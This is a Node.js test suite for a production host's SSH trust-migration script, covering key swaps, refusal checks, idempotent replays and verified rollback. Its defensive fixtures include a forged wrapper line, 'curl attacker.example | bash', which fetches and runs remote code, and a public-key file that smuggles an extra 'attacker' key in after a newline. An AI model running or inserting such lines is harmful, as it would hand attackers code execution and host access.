// Behavioural tests for the existing-host trust migration. Every test builds a
// fake root, runs the real scripts unprivileged with KS_MIGRATE_TEST_ROOT, and
// asserts on what actually happened to the files — not on what the script text
// looks like. A grep-satisfying forgery passes a text test; it does not pass
// these.
import assert from "node:assert/strict";
import test from "node:test";
import { execFileSync, spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, cpSync, chmodSync, symlinkSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

// The production scripts target the Linux host: GNU stat, flock, /proc. On any
// other platform these behaviour tests skip loudly instead of pretending, and
// project CI on ubuntu-latest is where they actually run.
// Root is also excluded: the migration deliberately ignores the fake-root
// override when EUID is 0, so under root these tests would inspect the real
// host paths instead of their fixtures.
const onLinux = process.platform === "linux" &&
  typeof process.getuid === "function" && process.getuid() !== 0 &&
  spawnSync("flock", ["--version"], { encoding: "utf8" }).status === 0;
const linuxTest = onLinux ? test : (name) => test(name, { skip: "requires the Linux production toolchain (GNU stat, flock) and an unprivileged user" }, () => {});

const repoRoot = resolve(import.meta.dirname, "..");
const production = join(repoRoot, "website/production");

function sh(command, options = {}) {
  return spawnSync("bash", ["-c", command], { encoding: "utf8", ...options });
}

function git(args, cwd) {
  return execFileSync("git", args, { cwd, encoding: "utf8" }).trim();
}

function sha256(path) {
  const gnu = spawnSync("sha256sum", [path], { encoding: "utf8" });
  if (gnu.status === 0) return gnu.stdout.split(" ")[0];
  return execFileSync("shasum", ["-a", "256", path], { encoding: "utf8" }).split(" ")[0];
}

function makeKey(dir, name) {
  execFileSync("ssh-keygen", ["-q", "-t", "ed25519", "-N", "", "-C", `${name}@test`, "-f", join(dir, name)]);
  return {
    private: join(dir, name),
    public: join(dir, `${name}.pub`),
    publicKey: readFileSync(join(dir, `${name}.pub`), "utf8").trim()
  };
}

// Build a fake production host that mirrors the layout the real one has, plus a
// local stand-in for the kiaquila/ks origin whose main carries the reviewed
// production scripts byte-for-byte.
function buildFakeHost() {
  const root = mkdtempSync(join(tmpdir(), "ks-migrate-test-"));
  const keys = mkdtempSync(join(tmpdir(), "ks-migrate-keys-"));
  for (const dir of [
    "opt/ks-design-portfolio",
    "var/lib/ks-production/staging",
    "var/lock",
    "home/ksdeploy/.ssh",
    "usr/local/sbin",
    "usr/local/libexec",
    "root/.ssh"
  ]) mkdirSync(join(root, dir), { recursive: true });

  const oldActionKey = makeKey(keys, "old-action");
  const newActionKey = makeKey(keys, "new-action");
  const newSourceKey = makeKey(keys, "new-source");

  const authorizedKeys = join(root, "home/ksdeploy/.ssh/authorized_keys");
  writeFileSync(
    authorizedKeys,
    `restrict,command="/usr/local/sbin/ks-production-ssh-command" ${oldActionKey.publicKey}\n`
  );

  const oldWrapper = join(root, "usr/local/sbin/ks-production-deploy");
  writeFileSync(oldWrapper, "#!/usr/bin/env bash\necho old web-design wrapper\n");
  chmodSync(oldWrapper, 0o755);
  const oldSshCommand = join(root, "usr/local/sbin/ks-production-ssh-command");
  writeFileSync(oldSshCommand, "#!/usr/bin/env bash\necho old web-design forced command\n");
  chmodSync(oldSshCommand, 0o755);

  // A real old mirror: the rollback has to be able to read the recorded
  // production tree out of it, so an empty bare repository will not do.
  // The live host is pre-split: the old wrapper registered `<revision>:ks`, the
  // monorepo's KS project subtree, so the fixture mirrors that layout.
  const oldWork = mkdtempSync(join(tmpdir(), "ks-old-work-"));
  mkdirSync(join(oldWork, "ks/website"), { recursive: true });
  writeFileSync(join(oldWork, "ks/website/index.html"), "<!doctype html>old\n");
  execFileSync("git", ["init", "--quiet", "--initial-branch=main", oldWork]);
  execFileSync("git", ["-C", oldWork, "config", "user.email", "test@test"]);
  execFileSync("git", ["-C", oldWork, "config", "user.name", "test"]);
  execFileSync("git", ["-C", oldWork, "add", "-A"]);
  execFileSync("git", ["-C", oldWork, "commit", "--quiet", "-m", "old production"]);
  const oldWebsiteTree = git(["rev-parse", "HEAD:ks"], oldWork);
  const oldCommit = git(["rev-parse", "HEAD"], oldWork);
  const oldMirror = join(root, "var/lib/ks-production/source.git");
  execFileSync("git", ["clone", "--quiet", "--bare", oldWork, oldMirror]);
  execFileSync("git", ["--git-dir", oldMirror, "remote", "set-url", "origin", "git@github.com:kiaquila/web-design.git"]);
  execFileSync("git", ["--git-dir", oldMirror, "update-ref", "refs/remotes/origin/main", oldCommit]);

  writeFileSync(join(root, "var/lib/ks-production/latest-candidate"), `4242 ${oldWebsiteTree}\n`);
  writeFileSync(join(root, "root/.ssh/known_hosts"), "github.com ssh-ed25519 AAAA-test\n");
  const oldSourceKey = makeKey(keys, "old-source");
  cpSync(oldSourceKey.private, join(root, "root/.ssh/ks-production-source"));
  writeFileSync(join(root, "running-revision"), `${oldCommit}\n`);

  // Local stand-in for kiaquila/ks: a work repo committed and cloned bare.
  const ksWork = mkdtempSync(join(tmpdir(), "ks-origin-work-"));
  mkdirSync(join(ksWork, "website/production"), { recursive: true });
  for (const file of ["server-deploy.sh", "ssh-command.sh", "production-common.sh", "migrate-existing-host.sh"]) {
    cpSync(join(production, file), join(ksWork, "website/production", file));
  }
  execFileSync("git", ["init", "--quiet", "--initial-branch=main", ksWork]);
  execFileSync("git", ["-C", ksWork, "config", "user.email", "test@test"], { encoding: "utf8" });
  execFileSync("git", ["-C", ksWork, "config", "user.name", "test"], { encoding: "utf8" });
  execFileSync("git", ["-C", ksWork, "add", "-A"], { encoding: "utf8" });
  execFileSync("git", ["-C", ksWork, "commit", "--quiet", "-m", "reviewed main"], { encoding: "utf8" });
  const ksOrigin = mkdtempSync(join(tmpdir(), "ks-origin-bare-")) + "/ks.git";
  execFileSync("git", ["clone", "--quiet", "--bare", ksWork, ksOrigin]);
  const newMain = git(["rev-parse", "HEAD"], ksWork);

  return { root, keys, oldActionKey, newActionKey, newSourceKey, oldSourceKey, authorizedKeys, oldWrapper, oldSshCommand, oldMirror, oldWebsiteTree, oldCommit, ksOrigin, newMain };
}

function runMigration(host, { env = {}, args = {} } = {}) {
  const defaults = {
    "--new-action-public-key-file": host.newActionKey.public,
    "--new-source-key": host.newSourceKey.private,
    "--expected-new-main": host.newMain,
    "--expected-old-wrapper-sha256": sha256(host.oldWrapper),
    "--expected-old-run-id": "4242",
    "--expected-old-tree": host.oldWebsiteTree,
    "--expected-running-revision": host.oldCommit,
    ...args
  };
  const argv = Object.entries(defaults).flatMap(([flag, value]) => [flag, value]);
  return spawnSync("bash", [join(production, "migrate-existing-host.sh"), ...argv], {
    encoding: "utf8",
    env: {
      ...process.env,
      KS_MIGRATE_TEST_ROOT: host.root,
      KS_MIGRATE_TEST_NEW_REMOTE: host.ksOrigin,
      KS_MIGRATE_EXPECTED_AUTHORIZED_KEYS_SHA256: sha256(host.authorizedKeys),
      ...env
    }
  });
}

linuxTest("a successful migration swaps every trust facet and preserves rollback", () => {
  const host = buildFakeHost();
  const oldAuthorizedSha = sha256(host.authorizedKeys);
  const result = runMigration(host);
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /KS_PRODUCTION_TRUST_MIGRATED/);

  const stateDir = join(host.root, "var/lib/ks-production");
  assert.equal(
    git(["--git-dir", join(stateDir, "source.git"), "remote", "get-url", "origin"], host.root),
    host.ksOrigin
  );
  assert.equal(
    git(["--git-dir", join(stateDir, "source.git"), "rev-parse", "refs/remotes/origin/main"], host.root),
    host.newMain
  );
  assert.equal(
    sha256(join(host.root, "usr/local/sbin/ks-production-deploy")),
    sha256(join(production, "server-deploy.sh"))
  );
  const authorized = readFileSync(host.authorizedKeys, "utf8");
  assert.match(authorized, /^restrict,command="[^"]+" ssh-ed25519 /);
  assert.ok(authorized.includes(host.newActionKey.publicKey.split(" ")[1]), "new key admitted");
  assert.ok(!authorized.includes(host.oldActionKey.publicKey.split(" ")[1]), "old key removed");
  assert.equal(readFileSync(join(stateDir, "trust-repository"), "utf8").trim(), "kiaquila/ks");
  assert.equal(readFileSync(join(stateDir, "latest-candidate"), "utf8"), "", "state namespace reset");
  const backup = join(stateDir, "web-design-trust-backup");
  assert.equal(sha256(join(backup, "authorized_keys")), oldAuthorizedSha, "old admission preserved");
  assert.equal(readFileSync(join(backup, "latest-candidate"), "utf8"), `4242 ${host.oldWebsiteTree}\n`);
  assert.ok(existsSync(join(backup, "source.git")), "old mirror preserved");
  const mirrorMode = execFileSync("stat", ["-c", "%a", join(stateDir, "source.git")], { encoding: "utf8" }).trim();
  assert.equal(mirrorMode, "700", "installed mirror stays root-only despite the umask");
});

linuxTest("a second run after success replays idempotently and changes nothing", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  const before = sha256(host.authorizedKeys);
  const replay = runMigration(host);
  assert.equal(replay.status, 0, replay.stderr);
  assert.match(replay.stdout, /already migrated to kiaquila\/ks/);
  assert.equal(sha256(host.authorizedKeys), before);
});

linuxTest("a key the host already trusts is refused before any write", () => {
  const host = buildFakeHost();
  const result = runMigration(host, { args: { "--new-action-public-key-file": host.oldActionKey.public } });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /must differ from every key the host already trusts/);
  assert.equal(readFileSync(join(host.root, "var/lib/ks-production/latest-candidate"), "utf8"), `4242 ${host.oldWebsiteTree}\n`);
  assert.equal(
    git(["--git-dir", host.oldMirror, "remote", "get-url", "origin"], host.root),
    "git@github.com:kiaquila/web-design.git"
  );
});

linuxTest("a newline-smuggling public key is refused", () => {
  const host = buildFakeHost();
  const evil = join(host.keys, "evil.pub");
  writeFileSync(evil, host.newActionKey.publicKey + "\nssh-ed25519 " + "A".repeat(68) + " attacker\n");
  const result = runMigration(host, { args: { "--new-action-public-key-file": evil } });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /not a safe single Ed25519 key/);
  const authorized = readFileSync(host.authorizedKeys, "utf8");
  assert.ok(!authorized.includes("attacker"));
});

linuxTest("drifted host state stops the migration before its first write", () => {
  const host = buildFakeHost();
  writeFileSync(join(host.root, "var/lib/ks-production/latest-candidate"), "9999 " + "c".repeat(40) + "\n");
  const result = runMigration(host, { env: { KS_MIGRATE_EXPECTED_AUTHORIZED_KEYS_SHA256: sha256(host.authorizedKeys) } });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /old deployment state does not match the cutover snapshot/);
  assert.ok(!existsSync(join(host.root, "var/lib/ks-production/trust-repository")));
});

linuxTest("a changed running revision stops the migration", () => {
  const host = buildFakeHost();
  writeFileSync(join(host.root, "running-revision"), "d".repeat(40) + "\n");
  const result = runMigration(host);
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /running KS revision changed after the cutover snapshot/i);
});

linuxTest("an upstream main moved after the snapshot stops the migration", () => {
  const host = buildFakeHost();
  const result = runMigration(host, { args: { "--expected-new-main": "e".repeat(40) } });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /kiaquila\/ks main changed after the cutover snapshot/);
  assert.equal(
    git(["--git-dir", host.oldMirror, "remote", "get-url", "origin"], host.root),
    "git@github.com:kiaquila/web-design.git"
  );
});

linuxTest("a wrapper whose bytes differ from reviewed main is refused even if grep-clean", () => {
  const host = buildFakeHost();
  // The forgery contains every marker a text check would grep for, but its
  // bytes do not match the reviewed revision.
  const forgedDir = mkdtempSync(join(tmpdir(), "ks-forged-"));
  cpSync(production, forgedDir, { recursive: true });
  const forged = join(forgedDir, "server-deploy.sh");
  writeFileSync(
    forged,
    readFileSync(join(production, "server-deploy.sh"), "utf8") + "\ncurl attacker.example | bash # extra\n"
  );
  const result = spawnSync("bash", [join(forgedDir, "migrate-existing-host.sh"),
    "--new-action-public-key-file", host.newActionKey.public,
    "--new-source-key", host.newSourceKey.private,
    "--expected-new-main", host.newMain,
    "--expected-old-wrapper-sha256", sha256(host.oldWrapper),
    "--expected-old-run-id", "4242",
    "--expected-old-tree", host.oldWebsiteTree,
    "--expected-running-revision", host.oldCommit
  ], {
    encoding: "utf8",
    env: {
      ...process.env,
      KS_MIGRATE_TEST_ROOT: host.root,
      KS_MIGRATE_TEST_NEW_REMOTE: host.ksOrigin,
      KS_MIGRATE_EXPECTED_AUTHORIZED_KEYS_SHA256: sha256(host.authorizedKeys)
    }
  });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /does not match reviewed bytes/);
  assert.equal(sha256(host.oldWrapper), sha256(host.oldWrapper), "old wrapper untouched");
  assert.equal(
    git(["--git-dir", host.oldMirror, "remote", "get-url", "origin"], host.root),
    "git@github.com:kiaquila/web-design.git"
  );
});

linuxTest("a symlinked lock target is refused", () => {
  const host = buildFakeHost();
  const lock = join(host.root, "var/lock/ks-production-deploy.lock");
  writeFileSync(join(host.root, "var/lock/victim"), "");
  symlinkSync(join(host.root, "var/lock/victim"), lock);
  const result = runMigration(host);
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /lock target must not be a symlink/i);
});

linuxTest("a failure after the swap begins rolls the trust path back and verifies it", () => {
  const host = buildFakeHost();
  const oldAuthorizedSha = sha256(host.authorizedKeys);
  const oldWrapperSha = sha256(host.oldWrapper);
  // Force a failure inside the swap: installing the new wrapper needs to
  // replace the file, which needs write on the sbin directory. The script
  // recreates libexec itself, so that is not a usable failpoint; sbin is.
  chmodSync(join(host.root, "usr/local/sbin"), 0o555);
  const result = runMigration(host);
  chmodSync(join(host.root, "usr/local/sbin"), 0o755);
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /Migration failed; restoring the recorded web-design trust path/);
  assert.match(result.stderr, /Rollback verified/);
  assert.equal(sha256(host.authorizedKeys), oldAuthorizedSha, "old admission restored");
  assert.equal(sha256(host.oldWrapper), oldWrapperSha, "old wrapper restored");
  assert.equal(
    git(["--git-dir", host.oldMirror, "remote", "get-url", "origin"], host.root),
    "git@github.com:kiaquila/web-design.git"
  );
  assert.equal(
    readFileSync(join(host.root, "var/lib/ks-production/latest-candidate"), "utf8"),
    `4242 ${host.oldWebsiteTree}\n`,
    "old state restored"
  );
  assert.ok(!existsSync(join(host.root, "var/lib/ks-production/trust-repository")), "namespace not left behind");
  assert.equal(
    sha256(join(host.root, "root/.ssh/ks-production-source")),
    sha256(host.oldSourceKey.private),
    "old source key restored — the restored wrapper fetches with this credential"
  );
  assert.match(
    readFileSync(host.oldSshCommand, "utf8"),
    /old web-design forced command/,
    "old forced-command handler restored — the restored key routes through it"
  );
});

linuxTest("a CRLF line in authorized_keys stops the migration instead of comparing zero keys", () => {
  const host = buildFakeHost();
  writeFileSync(
    host.authorizedKeys,
    `restrict,command="/usr/local/sbin/ks-production-ssh-command" ${host.oldActionKey.publicKey}\r\n`
  );
  const result = runMigration(host, {
    env: { KS_MIGRATE_EXPECTED_AUTHORIZED_KEYS_SHA256: sha256(host.authorizedKeys) }
  });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /carriage return/i);
  assert.ok(!existsSync(join(host.root, "var/lib/ks-production/trust-repository")));
});

linuxTest("replay after the first standalone deployment still reports idempotent success", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  // The wrapper writes the new namespace's state after the first deploy.
  writeFileSync(join(host.root, "var/lib/ks-production/latest-candidate"), "7 " + "f".repeat(40) + "\n");
  const replay = runMigration(host);
  assert.equal(replay.status, 0, replay.stderr);
  assert.match(replay.stdout, /already migrated/);
});

linuxTest("a malformed state file refuses the idempotent verdict", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  writeFileSync(join(host.root, "var/lib/ks-production/latest-candidate"), "not a state line\n");
  const replay = runMigration(host);
  assert.notEqual(replay.status, 0);
  assert.doesNotMatch(replay.stdout, /already migrated/);
});

linuxTest("staging leaves the live state directory's mode alone", () => {
  const host = buildFakeHost();
  const stateDir = join(host.root, "var/lib/ks-production");
  chmodSync(stateDir, 0o710);
  const result = runMigration(host);
  assert.equal(result.status, 0, result.stderr);
  const mode = execFileSync("stat", ["-c", "%a", stateDir], { encoding: "utf8" }).trim();
  assert.equal(mode, "710", "an in-flight old deployment still needs its traversal");
});

linuxTest("idempotent success is refused when the admission gained an extra line", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  const extraKey = makeKey(host.keys, "extra-action");
  const current = readFileSync(host.authorizedKeys, "utf8");
  writeFileSync(host.authorizedKeys, current + `restrict,command="/usr/local/sbin/ks-production-ssh-command" ${extraKey.publicKey}\n`);
  const replay = runMigration(host);
  assert.notEqual(replay.status, 0, "drifted admission must not be blessed as already-migrated");
  assert.doesNotMatch(replay.stdout, /already migrated/);
});

linuxTest("a backup mirror missing the deployed commit refuses the idempotent verdict", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  const mirror = join(host.root, "var/lib/ks-production/web-design-trust-backup/source.git");
  // Deleting refs alone leaves the commit readable, so it must actually be
  // pruned. The website tree is re-anchored on its own ref first so it survives
  // and the test isolates the missing commit rather than a missing tree.
  execFileSync("git", ["--git-dir", mirror, "update-ref", "refs/keep/tree", host.oldWebsiteTree], { stdio: "ignore" });
  for (const ref of ["refs/remotes/origin/main", "refs/heads/main"]) {
    spawnSync("git", ["--git-dir", mirror, "update-ref", "-d", ref], { stdio: "ignore" });
  }
  execFileSync("git", ["--git-dir", mirror, "reflog", "expire", "--expire=now", "--all"], { stdio: "ignore" });
  execFileSync("git", ["--git-dir", mirror, "gc", "--prune=now", "--quiet"], { stdio: "ignore" });
  assert.notEqual(
    spawnSync("git", ["--git-dir", mirror, "cat-file", "-e", `${host.oldCommit}^{commit}`]).status,
    0,
    "fixture must actually remove the commit"
  );
  const replay = runMigration(host);
  assert.notEqual(replay.status, 0, "a mirror that cannot supply the deployed commit is not a rollback package");
  assert.doesNotMatch(replay.stdout, /already migrated/);
});

linuxTest("a gutted backup mirror refuses the idempotent verdict", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  const mirror = join(host.root, "var/lib/ks-production/web-design-trust-backup/source.git");
  // Config and remote survive; refs and objects do not.
  rmSync(join(mirror, "refs"), { recursive: true, force: true });
  rmSync(join(mirror, "objects"), { recursive: true, force: true });
  mkdirSync(join(mirror, "refs"), { recursive: true });
  mkdirSync(join(mirror, "objects"), { recursive: true });
  const replay = runMigration(host);
  assert.notEqual(replay.status, 0, "a mirror that cannot supply the recorded tree is not a rollback package");
  assert.doesNotMatch(replay.stdout, /already migrated/);
});

linuxTest("a missing or foreign backup mirror refuses the idempotent verdict", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  const backup = join(host.root, "var/lib/ks-production/web-design-trust-backup");
  const mirror = join(backup, "source.git");
  // The five hashed files stay valid; only the mirror is gone.
  rmSync(mirror, { recursive: true, force: true });
  const replay = runMigration(host);
  assert.notEqual(replay.status, 0, "the rollback cannot restore a mirror that is not there");
  assert.doesNotMatch(replay.stdout, /already migrated/);
});

linuxTest("a manifest missing a restored file refuses the idempotent verdict", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  // An older revision's manifest: internally consistent, but written before the
  // forced-command handler joined the transaction.
  const backup = join(host.root, "var/lib/ks-production/web-design-trust-backup");
  const manifest = join(backup, "manifest.sha256");
  const trimmed = readFileSync(manifest, "utf8")
    .split("\n")
    .filter((line) => line && !line.endsWith("ks-production-ssh-command"))
    .join("\n") + "\n";
  writeFileSync(manifest, trimmed);
  const check = spawnSync("bash", ["-c", "cd '" + backup + "' && sha256sum -c manifest.sha256"], { encoding: "utf8" });
  assert.equal(check.status, 0, "the trimmed manifest still verifies on its own terms");
  const replay = runMigration(host);
  assert.notEqual(replay.status, 0, "an incomplete rollback package must not report success");
  assert.doesNotMatch(replay.stdout, /already migrated/);
});

linuxTest("a lost or corrupted backup manifest refuses the idempotent verdict", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  const manifest = join(host.root, "var/lib/ks-production/web-design-trust-backup/manifest.sha256");
  writeFileSync(manifest, readFileSync(manifest, "utf8").replace(/^[0-9a-f]{8}/, "00000000"));
  const replay = runMigration(host);
  assert.notEqual(replay.status, 0, "an unverifiable rollback package must not report success");
  assert.doesNotMatch(replay.stdout, /already migrated/);
});

linuxTest("the backup carries a verifiable manifest", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  const backup = join(host.root, "var/lib/ks-production/web-design-trust-backup");
  const check = spawnSync("bash", ["-c", "cd '" + backup + "' && sha256sum -c manifest.sha256"], { encoding: "utf8" });
  assert.equal(check.status, 0, check.stdout + check.stderr);
  for (const name of ["authorized_keys", "latest-candidate", "ks-production-deploy", "ks-production-source", "ks-production-ssh-command"]) {
    assert.match(check.stdout, new RegExp(`${name}: OK`));
  }
});

linuxTest("a successful migration also installs the new source credential", () => {
  const host = buildFakeHost();
  assert.equal(runMigration(host).status, 0);
  assert.equal(
    sha256(join(host.root, "root/.ssh/ks-production-source")),
    sha256(host.newSourceKey.private),
    "new key in service"
  );
});

